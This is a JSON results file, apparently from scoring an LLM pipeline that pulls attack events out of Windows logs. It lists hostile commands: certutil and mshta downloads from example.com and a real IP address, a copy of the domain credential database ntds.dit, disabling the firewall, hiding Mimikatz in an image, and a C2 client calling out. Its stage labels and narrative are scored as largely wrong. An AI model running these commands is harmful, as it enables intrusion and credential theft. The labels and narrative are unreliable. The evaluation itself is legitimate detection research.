@@ -1,0 +1,159 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\ WINDOWS\\ system32\\ smartscreen.exe - Embedding",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil - urlcache - split - f http :// example . com / x . exe C : \\ x . exe ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ Program Files ( x 86)\\ Microsoft\\ Edge\\ Application\\ DEVOBJ . dll",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\ Program Files ( x 86)\\ Microsoft\\ Edge\\ Application\\ msedge . exe -- no - startup - window / prefetch : 5",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd / c esentutl . exe / y / vss c : \\ windows \\ ntds \\ ntds . dit / d c : \\ ntds . dit",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sethc . exe / AccessibilitySoundAgent",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "net group \"domain admins\" /domain",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Program Files\ntopasswordsafe\ntopasswordsafe.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c del /f /q T1218.005[1].hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\ncryptCAT.inf' 'c:\\program files\\common files\\cryptCAT\\cryptCAT.inf'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sethc.exe /AccessibilitySoundAgent",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-Webrequest http://124.223.85.207:8082/Test.hta -Method Post -UseBasicParsing -ContentType 'application/json'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /c Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo \ufffd\ufffd\ufffd\ufffd\u01fdUFFFD\u0479\u0440FFFF& pause",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe  -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attack begins with multiple initial footholds through either the Smartscreen application, PowerShell scripts, or other applications running as Administrator. This foothold allows the execution of various tools to enumerate the system environment, disable Defender, elevate privileges, and evade detection. Through persistence mechanisms and privilege escalation, the attackers establish command and control channels, steal domain admin credentials, discover additional information about the target environment, and execute further actions remotely. Finally, the attackers utilize lateral movement techniques to navigate between hosts, creating new communication channels and demonstrating eventual goals related to credential theft.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 92094,
+      "completion_tokens": 7311,
+      "total_tokens": 99405,
+      "wall_clock_s": 101.859,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.14814814814814814,
+      "recall": 0.25,
+      "f1": 0.18604651162790697,
+      "tp": 4,
+      "fp": 23,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 27,
+      "fn": 14,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.17391304347826086,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 92094,
+      "completion_tokens": 7311,
+      "total_tokens": 99405,
+      "wall_clock_s": 101.859,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
